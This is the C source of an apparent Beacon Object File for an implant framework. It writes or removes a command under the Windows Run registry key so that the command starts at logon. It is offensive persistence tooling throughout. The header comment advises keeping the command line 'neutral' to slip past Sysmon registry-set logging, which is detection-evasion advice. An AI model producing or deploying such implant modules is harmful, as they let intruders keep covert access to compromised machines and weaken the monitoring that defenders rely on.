/*
 * runkey.c — set or delete a Run-key value (HKCU default, HKLM optional).
 *
 * args: str valueName, str command, int mode (1=set, 0=del), int hive (0=HKCU, 1=HKLM)
 *
 * OPSEC: Sysmon 13 (registry set) with the literal value — the command line is
 * the artifact; keep it neutral. HKLM needs admin. persist-inventory lists both.
 * The kit does NOT auto-start anything from these keys — set/remove is the whole
 * operation; never leave a Run value pointing at a file you intend to delete.
 */
#define CINTERFACE 1
#include <windows.h>
#include <string.h>
#include "beacon.h"

DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, const char*, DWORD, LPDWORD, DWORD, REGSAM, const SECURITY_ATTRIBUTES*, HKEY*, PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, const char*, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegDeleteValueA(HKEY, const char*);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegQueryValueExA(HKEY, const char*, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT int __cdecl MSVCRTsprintf(char*, const char*, ...);
DECLSPEC_IMPORT int __cdecl MSVCRTstrlen(const char*);

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    char* nameA = BeaconDataExtract(&p, NULL);
    char* cmdA  = BeaconDataExtract(&p, NULL);
    int   mode  = BeaconDataInt(&p);
    int   hklm  = BeaconDataInt(&p);
    if (!nameA || !*nameA || (!cmdA && mode)) {
        BeaconPrintf(CALLBACK_ERROR, "usage: runkey <valueName> <command=-> <mode 1=set|0=del> [hive 0=HKCU|1=HKLM]\n");
        return;
    }

    HKEY root  = hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    char subA[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY h;
    LSTATUS st;

    if (mode == 1) {
        st = ADVAPI32$RegCreateKeyExA(root, subA, 0, NULL, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, NULL, &h, NULL);
        if (st != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyExA %lu (HKLM = admin needed?)\n", (unsigned long)st);
            return;
        }
        st = ADVAPI32$RegQueryValueExA(h, nameA, NULL, NULL, NULL, NULL);
        if (st == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[!] value existed, overwriting: %s\n", nameA);
        st = ADVAPI32$RegSetValueExA(h, nameA, 0, REG_SZ, (const BYTE*)cmdA, (DWORD)strlen(cmdA) + 1);
        ADVAPI32$RegCloseKey(h);
        if (st == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] run-key set  %s\\%s = %s\n",
                         hklm ? "HKLM" : "HKCU", nameA, cmdA);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegSetValueExA %lu\n", (unsigned long)st);
        }
    } else {
        st = ADVAPI32$RegCreateKeyExA(root, subA, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL);
        if (st != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyExA %lu\n", (unsigned long)st);
            return;
        }
        st = ADVAPI32$RegDeleteValueA(h, nameA);
        ADVAPI32$RegCloseKey(h);
        if (st == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] run-key value deleted: %s\\%s\n",
                         hklm ? "HKLM" : "HKCU", nameA);
        } else if (st == 2) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] value absent: %s\n", nameA);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegDeleteValueA %lu\n", (unsigned long)st);
        }
    }
}